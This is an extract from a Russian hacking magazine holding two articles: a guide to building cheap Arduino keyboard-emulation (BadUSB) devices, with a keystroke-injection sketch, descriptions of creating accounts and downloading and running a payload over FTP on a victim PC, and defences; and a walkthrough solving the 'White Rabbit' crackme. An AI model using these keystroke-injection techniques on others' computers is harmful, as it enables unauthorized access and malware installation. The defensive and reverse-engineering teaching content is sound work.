                    информация в ней носит ознакомительный харак‐
                          тер. Ни автор, ни редак ция не несет ответствен‐
                       ности за неп равомерное использование упомяну‐
                       тых в ней аппаратных плат форм, программ и тех‐
                          ник!



ВЫБИРАЕМ АППАРАТНУЮ ПЛАТФОРМУ
Сотворить такую хакерскую железку можно и на одноплатниках (вроде Rasp‐
berry Pi), но это все равно что перевозить ноутбук на фуре. Есть «братья
меньшие» не такие известные, но не менее «злые» и опасные в руках из плеч.
По сути, для выпол нения HID‐атаки нам необ ходим микроконтрол лер, USB‐
порт и минимальная электронная обвязка, чтобы это все заработало.


Arduino Micro Pro
На мой взгляд, это один из идеальных кандидатов на роль хакерского девай‐
са.





                              Arduino Micro Pro

Плата   размером   33×16  мм   работа ет   на   микроконтроллере
ATmega32u4 и имеет на борту 28 Кбайт свобод ной памяти  (вообще
памяти 32 Кбайт, но 4 Кбайт уже заняты заг рузчи ком). С ней очень легко
работать, так как проект Arduino хорошо поддерживается и для него написано
много документации. Также для него есть готовая среда разработки Arduino
IDE с дистрибутивами для Windows, Linux и macOS. Купить плату можно
от 350 рублей.


Teensy Low Cost





                               Teensy LC

Хорошая альтернатива — семейство плат Teensy, совместимых с Arduino.
С ними также можно использовать Arduino IDE. Например, плата Teensy LC
размером 17×35 мм осна щена процессорным ядром ARM Cortex‐M0+
и 64 Кбайт памяти. Купить ее в России может быть проблематично (основной
упор делается на продажи Teensy 3.2–3.6), но заказать из‐за рубежа вполне
возможно. Цены на Teensy LC начина ются от 10 долларов.


Digispark
Многие думают, что Digispark — это самая подходящая плата для HID‐атак.
Да, она выигрывает по некоторым параметрам у остальных: крошечный раз‐
мер 18×22 мм, практически нет лишних функций (и точек отказа), USB‐разъем
типа А и смешная цена порядка 100–150 руб лей.
  Однако в исполь зовании она не так прос та. Даже подключать ее стоит
в порт USB 2.0 (или через USB‐хаб v.2.0) либо лезть в BIOS, отключать xHCI
и выставлять режим USB 3.0 порта как USB 2.0 compatible. Обратная сов‐
местимость у версий USB 3.0 и 2.0 заявлена, но порой нужен бубен, чтобы
она реально зарабо тала, особенно на Windows 10.





                                   Digispark

Работает  данная  плата  под  управлением  микроконтроллера  Attiny85.
С памятью у нее негусто — всего 8 Кбайт, из которых два уже заняты заг‐
рузчиком. Сов сем не вдохновляет ограничение ROM в 512 байт под исполня‐
емый код, но оптимизация тебе в помощь.
  Процессор (если его можно так назвать) опять же совместим с Arduino
IDE,     только     желательно     использовать     версию      1.6.5r2,
а 1.6.6 и 1.6.7 не рекомендуется вовсе. Digispark Wiki любез но предоставляет
мануал по «вживлению» этой пла ты в Arduino IDE, или можно скачать уже спе‐
циально заточенные версии ПО.


Альтернативы
Выше я привел для примера три платы, которые, на мой взгляд, идеально
подходят для HID‐атак, но под конкретную задачу может быть инте реснее
взять какую‐то другую. Вот еще примеры плат и некоторые соображения,
почему они были отвергнуты в качес тве универ саль ного варианта.
  NodeMCU и SparkFun с микроконтроллером ESP8266. Этот чип раз‐
рабатывался с направлением на поддержку Wi‐Fi, поэтому платы с бес про‐
водным модулем получились довольно большими. NodeMCU имеет раз‐
мер 60×30 мм при не самой выгодной цене от 400 рублей. Однако если пла‐
нируется многоэтапная атака, то беспро водное подключение будет совсем
не лишним.
   SparkFun в целом неплох, но смущает ценой (от 17 дол ларов за копеечный
процессор). Однако его контроллер совместим с Arduino IDE, что делает раз‐
работку удобной.
  Функционально Particle Photon похож на платы с ESP8266, но его цена
гораздо выше. На бор ту у него довольно дорогой и ненужный для HID‐атак
ARM Cortex M3 STM32F205RGY6 с Wi‐Fi‐модулем Broadcom BCM43362, что
поднимает цену до 2000 рублей и выше. Он будет оправдан в том случае,
если помимо эмуляции клавиату ры пла нируется выполнять какие‐то более
сложные задачи, требующие универ сального процес сора архитектуры ARM.


             INFO

                   Обрати внимание, что из всех рассмот ренных
                        плат лишь Digispark оснащен USB‐портом типа А.
                       Остальные имеют разъемы micro‐USB и  mini‐
                     USB, поэтому советую сразу обзавестись OTG‐
                       адаптером на интерфейс платы или кабелем
                       для  подключения  нашего  хакерского  девайса
                          к компу.



ДЕЛАЕМ ХАКЕРСКИЙ ДЕВАЙС ЗА ПЯТЬ ДОЛЛАРОВ
Приступим  к практической час ти на примере платы  Arduino  micro Pro
и переходника mini‐USB ↔ USB Type A. В качестве основной ОС использует‐
ся Kali Linux (4.14.0‐kali3‐amd64), но на дру гих сборках Linux и в Windows
проблем возникнуть не должно. Arduino IDE v. 1.8.6 скачана с офи циального
сайта. В качестве жертвы выбран тот же компьютер.


Го товим софт
Скачиваем дистрибутив, распаковываем. В каталоге лежит файл с символич‐
ным названием install.sh. Его и запустим на исполнение:


./install.sh

Минуту‐две смотрим на надпись Adding desktop shortcut, menu item and ﬁle as‐
sociations for Arduino IDE... и вуаля! На рабочем столе появляется ярлык
для запуска.
   Теперь подклю чаем нашу плату. Весь нужный софт установился вместе
с IDE, поэтому нет необходимос ти что‐то доустанавливать, монтировать
и запускать.
  Командой lsusb можно про верить, что устрой ство определено верно
и все идет по плану (Arduino Micro Pro определяется как Leonardo).





                                     lsusb

Следующая команда покажет порт, на котором повис наш Leonardo:


ls /dev/ | grep tty

У меня это ttyACM0.





                                          ls /dev/ | grep tty

Теперь можно открыть саму IDE. Сразу после запуска идем в меню «Инстру‐
менты» и в разделе «Пла ты» выбира ем Arduino Leonardo. Там же в «Инстру‐
ментах» выбираем нужный порт (он там, скорее всего, будет один) из списка
tty.
  После этих действий связь платы с компь юте ром установлена, програм‐
мное обеспечение настроено, можно переходить к написанию скетча (так
называют код для Arduino‐совместимых макетных плат).
  После запуска Arduino IDE картинка будет следующая.





                    Ин терфейс Arduino IDE

Есть еще один вариант запус тить подобие Arduino IDE. На сайте представлен
Arduino Web Editor. На мой взгляд, он менее удо бен, но тут уже кому как по
вкусу. Для его исполь зования будет необ ходимо зарегис трироваться на сай‐
те либо авторизоваться через Google‐аккаунт. Также для связи браузера
с устройством потребуется уста новить плагин (он есть для Chrome и Firefox).
Его удобство в том, что все написанные скетчи будут онлайн (с любой точки
земли можно получить дос туп к ним), но я в таких тонких деталях предпочитаю
локальную работу.





                  Ин терфейс Arduino Web Editor

В остальном редакторы похожи.
  Изначально присутствует заготовка из void  setup() и void  loop().
Напомню, что код, написанный в функции setup(), будет исполняться сразу
при подаче питания на пла ту, причем он исполнится один раз. Функция loop(
) отреагирует на питание таким же образом, вот только повторяться действие
будет постоянно (цикл с бесконечным счет чиком и неизменным кодом на каж‐
дый проход).


                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
          ЗЛОЙ HID
                     ДЕЛАЕМ И ПРОГРАММИРУЕМ
                  ХАКЕРСКИЙ ДЕВАЙС ДЛЯ HID‐АТАК





ПИШЕМ СКЕТЧ
Нам нужно, чтобы мик роплата Arduino выдава ла себя за клавиату ру. Для этого
в самом начале сле дует добавить библиотеку Keyboard.h.
  Далее основные элементы, которыми мы будем пользоваться:
 • Keyboard.begin() — строка необ ходима для начала эмуляции клавиату‐
   ры;
 • Keyboard.print() — вводит заданный текст;
 • Keyboard.press() — зажимает указанную клавишу;
 • Keyboard.release() — отпуска ет указанную клавишу;
 • Keyboard.releaseAll() — отпуска ет все клавиши;
 • delay() — задает период ожи дания (между командами или для начала
   выполнения действия).

Ключи нажимаемых клавиш можно найти тут. Для простоты мы говорим
«нажимаем/отпускаем клавишу», подразумевая, что контроллер отправляет
ее скан‐код, имитируя нажатие командами Keyboard.press/Keyboard.release.
  Каждый,  кто  немного  касался  программирования,  знает  о  том,
как работать с повторяющимися вызовами. Если мы начинаем копипастить
участки кода, то пора вызывать парней в белых халатах. Поэтому повторения
будем выполнять с помощью отдельной функции.
  Задается она вот такой конструкцией:


void function_name(){
    ...
}

В скетче указывается как function_name(). Для начала дру гие элементы
управления платой нам не понадобятся.
   Теперь можно попробовать написать свой первый скетч. Ведь в теории
между теорией и практикой разницы нет, а на практике — есть.
  В качестве PoC исполь зуем такую задачу: пос ле подключения нашего
девайса в USB‐порт на компе с Linux должен автоматичес ки открыться тер‐
минал, а затем в домашнем катало ге создать ся файл с содержимым Hello
World, который открывает ся в текстовом редакторе (у меня будет Leafpad).
   Скетч выглядит сле дующим обра зом.





                          Код задания

В самом начале указана знакомая всем сишникам конс трукция #include c
указанием на использование библиотеки Keyboard.h. Как уже говорилось
выше, она нужна для того, чтобы наша арду ина смог ла выдать себя за кла‐
виатуру.
  В коде повторяется нажатие клавиши Enter три раза, поэтому удобнее соз‐
дать отдельную функцию pressEnter(), что я и сделал. Обрати внимание:
она находится за пределами setup(), а между нажатиями клавиши Enter встав‐
лена задержка (ниже поясню, зачем она нужна).


Keyboard.press(KEY_RETURN);
delay(50);
Keyboard.release(KEY_RETURN);

Далее идет основная функция void setup().


Keyboard.begin(); // Начало эмуляции клавиатуры
delay(5000); // Задержка 5000 мс
Keyboard.press(KEY_LEFT_GUI); // Нажимаем клавишу «Пуск»
delay(5000);
Keyboard.release(KEY_LEFT_GUI); // Отпускаем ее
delay(500);
Keyboard.print("terminal"); // Пишем в поиске
delay(500);
pressEnter();
delay(1000);
Keyboard.print("echo Hello World >> test"); // На этом моменте
терминал уже открыт
delay(50);
pressEnter();
delay(1000);
Keyboard.print("leafpad test"); // Открываем файл test в Leafpad
delay(50);
pressEnter();

Сложно? Пока  нет, но ста нет сложнее, когда вместо Hello  World ты
запишешь в файл код зловреда и запус тишь его на исполнение.
  Поясню выставле ние пауз: тут нужен трепетный подход, потому как ОС
может не успеть отреагировать на команды. Допустим, ты не выставил паузу
и подключил свою ардуину. Она начина ет выполнять записанные действия
еще до того, как операционная система пой мет, что это за устройство, и под‐
клю чит его как клавиатуру. То есть половина команд просто уйдет в никуда,
и нужного результата мы не получим. Такая же исто рия между нажатием кла‐
виш и набором текста. Нашей жертве (компу) необ ходимо давать время, ина‐
че она не поймет, чего от нее вооб ще хотят.
   Есть еще один важный нюанс с рас кладкой клавиатуры. Мы написали код,
ориентированный на английскую раскладку. Если в момент подключения
нашего  устройства  к  атакуемому компьютеру раскладка  будет не  та,
под которую писался скетч, то нужного нам действия не получится. Горячие
и функциональные клавиши, конечно, отреагируют как надо, а вот с набором
текста возникнут проб лемы. Вмес то «terminal» получится «еукьштфд», со все‐
ми вытекающими последс твиями.


ПРИМЕРЫ АТАК
При проведении реаль ных HID‐атак можно начать с быстрого соз дания
локального пользователя. Демонстрирую это на примере Windows 10 сбор‐
ки 1607.





                     Создаем пользователя

Согласись — удобно. Незаметно вста вил микроардуину в USB‐порт чужого
компа, и через несколько секунд на нем уже появилась локальная учетка
с заданными тобой параметрами логин/пароль.
   Глянем чуть глубже и немного усложним. Подготовим FTP‐сервер и заг‐
рузим на него боевую нагрузку. И вот так будет выглядеть загрузка файла
и его запуск. Благодаря самой загрузке это займет чуть больше времени, но,
к примеру, админская сессия того стоит.





                        Заг ружа ем файл с FTP

Поясню момент с файлом: да, мож но выполнить все команды вводом, но суть
опять в тайм‐ауте исполнения. Мы не знаем, как дол го может сервер реаги‐
ровать на команды (на это влияет ско рость интернет‐соединения, скорость
работы самого компьютера и еще куча раз ных факторов). Также стоит учесть
то, что ты можешь использовать в сво их тес тах SSD (и все вроде бы работа‐
ет), но при подключении к компь ютеру с HDD... думаю, ты уловил смысл.
  Наверняка ты обращал внимание, что USB‐клавиатура опре деля ется BIOS
еще до загрузки ОС. В UEFI вообще интегрирована рас ширенная поддержка
USB‐портов разных версий с готовыми профиля ми для HID‐девайсов и USB‐
накопителей. Большой объем флеш‐памяти современных материнок и уни‐
фицированная структура UEFI позволя ют загрузить низкоуровневый бэкдор,
просто вставив копеечный хакерский девайс из ардуины.


КАК ЗАЩИТИТЬСЯ ОТ HID-АТАК
Как мне кажется, самый надеж ный способ защиты для любой ОС — блокиро‐
вать учетную запись (паролем, RFID‐чипом или биометрическим сканером),
когда уходишь из‐за компа. Фишка ата ки в бес палевности и скорости, поэто‐
му вряд ли пентестер будет вставлять такую штуку в заблокированный компь‐
ютер (хотя в некото рых довольно крупных орга низациях девочки из бухгалте‐
рии практикуют не блокировку компьюте ра, а выключение монитора. Как ты
понимаешь, это не подойдет). Также мож но совсем отключить незанятые
USB‐порты (в BIOS или физически), но что помеша ет атакующему вытащить
легитимную клаву и подключить вместо нее эмулятор на ардуине? Только нас‐
тройки политики безопасности и сторонний софт для контроля подключений
по USB.
   Что касается ОС Windows, то тут есть нес колько решений. Во‐первых, ком‐
плексные антивирусы. Они уже научились определять класс BadUSB и бло‐
кировать такие устрой ства. К примеру, в серверной части «Антивируса Кас‐
перского» при настройке политик безопасности есть функция «Защита
от атак BadUSB».





    Настройка политики безопасности с сервера управле ния Kaspersky

Во‐вторых, есть средства борь бы с подоб ного рода атаками при помощи
групповых политик. Необ ходимо открыть gpedit.msc, пройти цепочку «Кон‐
фигурация компьютера → Административные шаблоны → Система → Огра‐
ничения на установку устройств». В этом разделе есть несколько правил. Нам
нужно «Запретить установку устройств, не описанных другими параметрами
политики». Суть правила заключа ется в том, что при его включении драйвер
нового устройства не будет автомати чес ки уста новлен, если только этот
девайс прямо не указан в политиках. Есть, конечно, небольшое неудобство
в данном методе, но если все грамотно настроить, то проблем не будет.





           Настрой ка пра вил груп повой полити ки Windows 10

В своих исследованиях защиты от HID‐атак я использовал в качестве жертвы
комп с Windows 10 (1607). В первом случае анти вирь Касперского сработал
на ура. Во втором ОС сама заблокировала мое устройство. Правда, когда я
попытался подключить вторую клавиату ру к компьютеру, тоже получил отказ.
  Для Linux можно восполь зовать ся udev и его правилами. Необходимо соз‐
дать файл /etc/udev/rules.d/10‐usbblock.rules и вписать в него сле‐
дующее содержимое (клас сы мож но блокировать любые):


#ACTION=="add", ATTR{bInterfaceClass}=="03" RUN+="/bin/sh ‐c 'echo 0
>/sys$DEVPATH/../authorized'"

Теперь можно заблокиро вать добавление новых HID‐устрой ств командой


sed ‐i 's/#//' /etc/udev/rules.d/10‐usbblock.rules; udevadm control
‐‐reload‐rules

А вот команда для разблокировки:


sed ‐i 's/^/#/' /etc/udev/rules.d/10‐usbblock.rules; udevadm control
‐‐reload‐rules


ЗАКЛЮЧЕНИЕ
Эмуляция клавиатуры — опас ный инстру мент в умелых руках. Это было наг‐
лядно продемонстрировано еще в 2014 году на Black Hat. Доклад Building Tro‐
jan Hardware at Home вызвал всплеск интереса к данной теме.
  Изначально в серьезность угрозы верилось с тру дом, а в Сети циркулиро‐
вали шуточки на тему USBola, сравнивающие эту атаку с извес тным вирусом.
После публикации статьи Computer Ebola шутки закончились. Вдобавок Кар‐
стен Нол подлил масла в огонь, создав список уязвимых устрой ств, которые
удобно использовать для проведения атак вида BadUSB.
  За последние годы ситу ация изменилась. С одной стороны, стало проще
создавать копеечные эму лято ры клавиатуры, находить примеры готовых скет‐
чей и пейлоадов. С другой — некоторые комплексные системы защиты научи‐
лись распознавать хакерские HID‐девайсы, а в современных ОС появились
расширенные настрой ки политик безопасности, препятству ющие их несан‐
кционированному подключению.


        WWW

                    •Делаем реалистичный девайс для HID‐атак
                    •Подробное описание BadUSB
                    •BadUSB на Black Hat
ВЗЛОМ
 ЗАГАДКА
  ХЕШЕРЕЗАДЫ





РАЗГАДЫВАЕМ ИНТЕРЕСНЫЙ
КРАКМИ WHITE RABBIT
                                                                                         Nik Zerof
                                                                                             xtahi0nix@gmail.comИ КАЧАЕМ СКИЛЛ РЕВЕРСИНГА





Недавно мне на глаза попался один доволь но интересный
crackme. В нем нет антиотла дочных приемов или обфуска‐
ции кода, тем не менее решать его очень интересно: тут
и дешифровка строк, и финты с картинками. В этой статье я
по шагам покажу, что бы я делал, чтобы найти разгадку.


             INFO

                      Автор  статьи  выражает  благодарность  hash‐
                         erezade, автору crackme (пароль crackme).


По правилам нам нужно найти ключи и секретный флаг, а не просто поломать
механизмы валидации, что бы crackme думал, что он решен. Из инс трумен‐
тария нам понадобится: IDA, DiE и PuTTY. Начнем с DiE.





                          Crackme в DiE

Энтропия в норме, файл ничем не упа кован. Это вполне ожидаемо: накрывать
кракми известными навес ными упа ковщиками — признак плохого тона. Пос‐
тавить такую защиту может кто угодно, а ее сня тие — это рутина, а не
решение загадки. Давай запус тим кракми и посмотрим, как он работает, что
выводит на экран, как реагирует на ввод неправильного пароля.





                            Crackme

При загрузке мы видим цветные строчки и забавного кролика. На ввод неп‐
равильного пароля программа пишет строчку «Nope!» и закрывается. Заг‐
рузим крякмис в дизассемблер IDA и посмотрим на начало программы, стро‐
ки и структуру кода.





                             White Rabbit в IDA

Начальный код очень прост, и у нас есть два пути его анализа: поискать
перекрестные  ссылки  на  сообщения  о  вводе  пароля  (по‐крякерски!)
или начать его иссле довать с самого начала. Давай пойдем по второму
пути — в этом конкретном случае так будет интерес нее. Кроме того, обратим
внимание на структуру кода: рас познанных исполняемых инструкций не так
много. И нельзя не заметить раз мер файла — больше шести мегабайт!
  Запомним это все и начинаем исследовать код. Видим нес колько вызовов
и подпрограмму loc_403CDE.


loc_403CDE:
  push    offset aNope    ; "Nope!\n"
  push    0C0h            ; wAttributes
  call    sub_403990
  add     esp, 8
  push    3E8h            ; dwMilliseconds
  call    ds:Sleep
  or      eax, 0FFFFFFFFh
  retn

Судя по всему, этот код выполняется при неверном вводе пароля: выводится
сообщение «Nope!» и программа завершается. Давай переименуем эту под‐
программу в exit_err, чтобы было понятнее, что это завершение программы
после некорректного вво да данных.
   Итак, первый вызов — это call sub_402CC0. Заходим в него и разбира‐
емся.





                    От рисовка строк в консоли

Вызываются функции работы с атрибутами текста в консоли, кроме того, мы
видим буфер текста «Wake up, Neo… I have a challenge for…». Очевидно, этот
call отвечает за начальный баннер кракми. Переименуем call sub_402CC0
в call banner, чтобы нам было легче читать код в дальнейшем.
  Движемся дальше по коду. Пос ле вызова загрузочного баннера у нас идет
call sub_4034D0. Заходим в него — беглый осмотр показы вает, что это один
из уровней крякмиса. Об этом нам говорят следующие строки кода:


push    offset aPassword1 ; "Password#1:\n"
...
push    offset aSoFarSoGood ; "So far, so good!\n"

Это данные, которые передаются функции вывода на экран. С уве ренностью
переименовываем call  sub_4034D0 в call  level_1 и начинаем иссле‐
довать уровень более детально. Пос ле стандартного пролога и механизма
защиты от перепол нения буфера стека мы видим интересный код:


lea     eax, [ebp+nNumberOfBytesToWrite]
push    65h             ; hResData (101)
push    eax             ; int
mov     [ebp+nNumberOfBytesToWrite], 0
call    sub_403D90

Давай перейдем в call sub_403D90 и посмотрим, что там. А там находится
несложный код работы с ресурсами. Наб люда ется обилие вызовов Find‐
ResourceA, LoadResource, LockResource, SizeofResource. Дальше все
это завершается кодом выделения памяти и копирования данных:


mov     esi, [ebp+arg_0]
push    4               ; flProtect
push    3000h           ; flAllocationType
push    eax             ; dwSize
push    0               ; lpAddress
mov     [esi], eax
call    ds:VirtualAlloc
push    dword ptr [esi] ; size_t
mov     edi, eax
push    ebx             ; void *
push    edi             ; void *
call    _memmove_0

Становится понятно, что sub_403D90 читает ресурс нашего кракми и копиру ет
его в выделенный буфер в памяти. Переименуем sub_403D90 в load‐
_res_in_buf и остановимся на этом подробнее.
  Код push 65h говорит нам о ресурсе 101. Давай вернемся в DiE и пос‐
мотрим на ресурсы. Для этого жмем кнопочку Resource и в открывшемся окне
раскроем список под названием RT_RCDATA. Видим два ресурса, из которых
нас интересует 101.





                         Ресурсы в DiE

Открываем его в hex‐представлении.





                          Ресурс 101

Данные ресурса зашифрованы, но обра ти вни мание на символическое пред‐
ставление hex‐данных — четко виден повторя ющийся паттерн. Это значит,
что применен простой шифр, у которого отсутству ет лавинный эффект в шиф‐
ротексте, но присутствуют повторя ющиеся паттерны в шиф ровании. Похоже,
тут взяли какую‐то фразу‐пароль и поксорили ей данные блоками.
  Можно сделать предположение, что после первых нескольких десятков
байт идут одно родные данные, зашифрованные этим шифром. Выделя ем
повторяющийся паттерн и считаем его размер в байтах. Получается 17 байт.
Если мы верно сделали предположение насчет шифра, то 17 байт — длина
нашего пароля.





                         Паттерн в данных

Смотрим размер ресурса — 0x5eec36h, то есть 6 220 854 байт, или 5 Мбайт.
Результат выполнения функции сохраня ется в регистр esi.
  Возвращаемся к изу чению кракми. Видим код запроса пароля:


push    offset aPassword1 ; "Password#1:\n"
push    0A0h            ; wAttributes
call    sub_403990

Очевидно, что в функцию sub_403990 передаются данные, которые будут
выведены в консоль. Зайдя в нее, мож но убедиться в этом: функция весьма
похожа на функцию banner, которую мы уже видели. Переименуем sub‐
_403990 в print_str и идем дальше.
  Следующий вызов — call sub_401000. Если зайти в него, то окажется,
что он немного запутан из‐за инс трукций компилятора Microsoft Visual Studio
по отлову исключений и механизмов от переполнения буфера, которые мы
уже видели. А главное — что этой функции переда ется указатель на перемен‐
ную в стеке var_438. Если проследить манипуляции с этим указателем
в самой функции, то оказывается, что тут про исходит всего лишь чте ние вво‐
димых пользователем данных, которые записы ваются в эту переменную.
Вероятно,  это  чтение  пароля. Переименуем sub_401000 в read_data,
переменную var_438 — в pass и продолжим исследовать код.


Упражне ние
Чтобы попрактиковаться в ана лизе таких структур, попробуй иссле довать
простенькую программу с разными вари анта ми опти мизации в нас тройках
компилятора.


 int main(){
   std::cout << "Hello World!\n";
   std::string s;
   std::cin >> s;
   Sleep(5000);
   return 0;
 }




Далее следует интересный код:


call    sub_404150
add     esp, 1Ch
cmp     eax, 57585384h
jnz     loc_4036B1

Мы видим, что идет вызов call sub_404150 и далее сравнение cmp eax,
57585384h, затем условный переход. Очевидно, мы подошли вплотную
к логике проверки пароля. Прыгаем в call sub_404150 и смотрим, что там.





                        Подсчет хеша

Видим цикл операций xor с каким‐то «магическим» числом 82F63B78h. Если
поискать информацию об этом числе, то мы наткнемся на статью Википедии
о вычислении CRC32. Очевидно, цикл вычисляет CRC32 данных, далее идет
сравнение cmp eax, 57585384h, потом при нима ется решение о переходе.
Разумеется, 57585384h — это эталонный CRC32 пароля, который сравнива‐
ется с введенными данными. Переименуем sub_404150 в crc32 и читаем код
дальше.


lea     eax, [ebp+pass]
cmovnb  eax, [ebp+pass]
push    eax
push    [ebp+nNumberOfBytesToWrite]
push    esi
call    sub_403C90

Очень интересно. В функцию sub_403C90 передается пароль, переменная
nNumberOfBytesToWrite  (размер ресурса) и адрес ресурса. Заглянем
внутрь.





                      Дешифровка XOR

Разумеется, это функция дешифровки ресурса методом XOR. Пере именуем
функцию sub_403C90 в xor_crypt и просмотрим код далее.





                Работа с расшифрованным ресурсом

Беглый просмотр кода выявляет вызов функции WinAPI для получения пути
временной дирек тории, число миллисекунд с момента запуска компьютера
и вот такие инте ресные данные, которые кладутся в стек:


push    offset aSWallpXTmp ; "%s\\wallp%x.tmp"

Далее — функция sub_403090, которая создает и записывает данные в файл,
вызывая CreateFileW и WriteFile, и аргу менты которой выглядят таким
образом:


; int __cdecl sub_403090(LPCWSTR lpFileName, LPCVOID lpBuffer, DWORD
nNumberOfBytesToWrite)
sub_403090 proc near
NumberOfBytesWritten= dword ptr ‐4
lpFileName= dword ptr  8
lpBuffer= dword ptr  0Ch
nNumberOfBytesToWrite= dword ptr  10h

И далее — код установки обо ев рабочего стола в функции call sub_403D20,
о чем говорит параметр SPI_SETDESKWALLPAPER(0x0014), передаваемый
функции SystemParametersInfo:


.text:00403D23                 push    2               ; fWinIni
.text:00403D25                 push    [ebp+pvParam]   ; pvParam
.text:00403D28                 push    0               ; uiParam
.text:00403D2A                 push    14h             ; uiAction
.text:00403D2C                 call    ds:SystemParametersInfoW

Далее в дизасме идет сообщение об успешном вводе пароля.
   Итак, что мы име ем? Мы зна ем, что пароль будет 17 байт, знаем, что этим
паролем зашиф рован ресурс, который занима ет 5 Мбайт и будет в даль‐
нейшем установ лен как обои рабочего стола. Можно предположить, что наш
ресурс — это файл в формате BMP, который подходит под все эти признаки
(включая размер).
  Отталкиваясь от этого, будем рас суждать логичес ки: файл BMP начина‐
ется с заголовка, формат его документирован, и, посмотрев в документацию,
мы можем восстановить первые 17 байт заголовка. В итоге мы будем
иметь 17 байт шифротекста и 17 байт откры того текста. Учитывая, что алго‐
ритм шифрования — это XOR, мы можем поксорить эти последовательнос ти
между собой, чтобы таким образом получить пароль и расшифровать осталь‐
ные данные.
  Для начала нам нужен стандартный заголовок файла формата BMP.
Открываем в hex‐редакторе любую картинку в BMP, чтобы иметь перед гла‐
зами пример.





                   Файл BMP в hex‐редакторе



                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ

ЗАГАДКА ХЕШЕРЕЗАДЫ
               РАЗГАДЫВАЕМ ИНТЕРЕСНЫЙ КРАКМИ
           WHITE RABBIT И КАЧАЕМ СКИЛЛ РЕВЕРСИНГА




Обратимся  к  документации по  это му формату. Нас  интересуют  пер‐
вые 17 байт.

BMP Header:
 • 0h 2 42 4D — идентифика тор (буквы BM)
 • 2h 4 46 00 00 00 — раз мер файла (нам известен, запол няется в фор‐
   мате big‐endian)
 • 6h 2 00 00 — зарезервирова но
 • 8h 2 00 00 — зарезервирова но
 • Ah 4 36 00 00 00 — смещение начала изоб ражения

DIB Header:
 • Eh 4 28 00 00 00 — число байтов DIB header

Итак, восстановленный заголовок с извес тными данными:


42 4D 36 EC 5E 00 00 00 00 00 36 00 00 00 28 00 00

Шифротекст:


24 22 5A 80 31 77 5F 64 61 5F 44 61 62 62 41 74 7A





                     Результат операции XOR

Применяем XOR и получа ем фразу‐пароль: follow_da_rabbitz. Вводим ее
в кракми, и он сооб щает нам: So far, so good! Обои рабоче го стола меняются
на черный фон с изоб ражением кролика и предложением сохранять спокой‐
ствие и следовать за кро ликом. Кракми тем временем просит нас ввести вто‐
рой пароль.





                  Новые обои рабочего стола

Возвращаемся в IDA и исследуем следующий уровень. По структуре он очень
похож на предыдущий. Пос кольку мы уже дали функциям более понятные наз‐
вания, все становится еще про ще. Кроме того, мы понимаем, что в этот раз
после ввода корректного пароля также создает ся файл с ресурсом, который
имеет расширение exe. Это интересно! Давай взглянем на этот ресурс
в DiE — может, предыдущий трюк нам поможет и здесь? :)





                        Второй ресурс в DiE

Очевидно, что нет. Так просто здесь не будет. Давай смотреть функцию шиф‐
рования, то есть ту функцию, которая теперь на мес те xor_crypt. Теперь она
называется sub_403E10. Вот ее фрагменты, по которым ты можешь понять,
как работает алгоритм шифрования.


...
mov     esi, offset aMicrosoftEnhan ; "Microsoft Enhanced RSA and
AES Cryptogr"...
lea     edi, [ebp+szProvider]
push    eax             ; phProv
rep movsd
call    ds:CryptAcquireContextW
...
lea     eax, [ebp+phHash]
push    eax             ; phHash
push    0               ; dwFlags
push    0               ; hKey
push    800Ch           ; Algid
push    [ebp+phProv]    ; hProv
call    ds:CryptCreateHash
...
lea     eax, [ebp+phKey]
push    eax             ; phKey
push    0               ; dwFlags
push    [ebp+phHash]    ; hBaseData
push    660Eh           ; Algid
push    [ebp+phProv]    ; hProv
call    ds:CryptDeriveKey

Становится понятно, что этот шифр так прос то не взло мать, — это AES. Давай
вернемся и поищем подсказ ки, например в наших новых обоях рабочего сто‐
ла.


             INFO

                     На самом деле я сразу подумал, что раз уж есть
                         какой‐то   графический   файл,   то   нуж но
                      или готовить Stegdetect, или смотреть водяные
                       знаки. Прятать всякое в картинках сейчас модно!


Найдем картинку в директории временных файлов пользовате ля. Рас‐
ширение у нее — tmp, а название начина ется с wallp. Нужно всего лишь
поменять расширение на bmp, и можно открывать в Paint. Для поиска водяных
знаков бывает удоб но инвертировать цвета.





                    Ин версия цветов обоев

Бинго! Наш пароль — это водяной знак в изображении, IMdsSqFGLf6v_wxO.
Пробуем ввести его в кракми.





                     Верный вто рой пароль

Крякмис принимает этот пароль и закрыва ется. Но мы‐то помним, что он соз‐
дает во вре менной директории и запускает файл good_rabbit****.exe!





                     Файл кракми запущен

Загружаем его в IDA и смотрим импорт файла.





                  Импорт нового фай ла

Интересно — тут есть функции работы с сетью. Следовательно, изучим
сетевую активность при ложения. Можешь сделать это хоть в любимом фай‐
рволе, хоть коман дой netstat ‐a. Понимаем, что наш файл открыл и слушает
порт 1337. Что ж, давай прямо в лоб и поищем функцию WSAStartup
или номер порта в IDA.





                    Нашли WSAStartup

Мы нашли WSAStartup, она в самом начале функции под наз ванием sub‐
_404480. Поднимаемся на уро вень выше и смот рим, какие параметры
передаются в эту функцию. Открываем первую перекрес тную ссылку на нее
(да‐да, мы находимся в TLS, но это не имеет никакого отношения к делу :)).





                     Нас трой ка пор та сервера

А вот и номер порта в качестве параметра! Скроллим чуть ниже и видим
еще  назначение пор тов и переда чу  в  эту функцию. Порты —  1337,
1338 и 1339. Заходим в sub_404480 и смотрим, что делает эта функция.
Перед  нами  стандартная  инициализация  работы  с  сетью,  вызовы
WSAStartup, socket, inet_addr, bind, listen и accept. Кто писал кли‐
ент‐серверные приложения, знает эту структуру как свои пять пальцев, поэто‐
му тут все банально и мы это про пус каем. А интересный вызов у нас уже меж‐
ду accept и closesocket.





          Функция работы с данными, пос тупа ющими на порт

Давай заглянем в него.





                      Раз гадка работы сервера

В общем‐то, код совсем простой, и он умещает ся на один скриншот. Если
с самого начала мы вво дим 9, то на экране показывается Y. Переходим
из подпрограммы дальше, порт меня ется на другой, на единицу больше. Мы
вводим 3 — показывается E, опять переходим на следующий порт и вводим 5,
видим S.
   Эти данные нужно посылать на порт, начав с 1337 и подключаясь всякий
раз к порту на единицу больше. То есть 1337 → 9, 1338 → 3, 1339 → 5. Я
посылал данные на порты при помощи прог раммы PuTTY. Пос ле этого соеди‐
нение с сервером закрывается и открывает ся браузер с коротким виде оро‐
ликом, в котором нам демонс трируется секретный флаг.
   Crackme решен! :)
ВЗЛОМ





                                                                                    Айгуль C.
                                                                                        Девушка‐гик, фриланс‐
                                                                                       программист
                                                                                                aigulforever@yandex.ru


        ВАМ
    ПРИШЛО
       MMS

